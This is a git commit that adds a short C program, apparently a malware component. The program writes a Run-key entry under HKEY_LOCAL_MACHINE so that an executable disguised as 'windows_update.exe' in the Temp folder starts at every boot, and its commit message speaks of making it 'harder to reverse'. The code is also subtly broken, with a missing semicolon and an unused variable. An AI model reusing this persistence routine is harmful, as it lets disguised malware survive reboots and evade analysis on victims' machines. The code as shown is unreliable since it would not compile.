915318eed5bae43b4df16759f0b4c0c5aa24dba8
Matthew Bobbitt <matthew.bobbitt@internal.leahycenter.org>
2023-04-06 17:16:40 -0400

    untested reformatting script should be harder to reverse

---
+++ registry_reformatted.c
@@ -0,0 +1,27 @@
+#include<windows.h>
+#include<stdio.h>
+int persistence(const char *reg_key, const char *value){
+    char* number = 0x00000000; 
+    HKEY key;
+    LSTATUS rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(reg_key), 0, KEY_SET_VALUE, &key);
+    if(ERROR_SUCCESS != rc){
+        printf("RegOpenKeyEx failed: %u\n", GetLastError());
+        RegCloseKey(key);
+        return -1;
+    }
+    rc = RegSetValueEx(key, TEXT("Update"), 0, REG_SZ, (const BYTE*)value, (lstrlen(value)+1) * sizeof(TCHAR));
+    if(ERROR_SUCCESS != rc){
+        printf("RegSetValueExA failed: %u\n", GetLastError());
+        RegCloseKey(key);
+        return -1;
+    }  
+    rc = RegCloseKey(key)
+    if(ERROR_SUCCESS != rc){
+        printf("RegCloseKey failed: %u\n", GetLastError());
+        return -1;
+    }
+    return 0;
+}
+int main(){
+    persistence("Software\\Microsoft\\Windows\\CurrentVersion\\Run","C:\\Windows\\Temp\\windows_update.exe");
+}
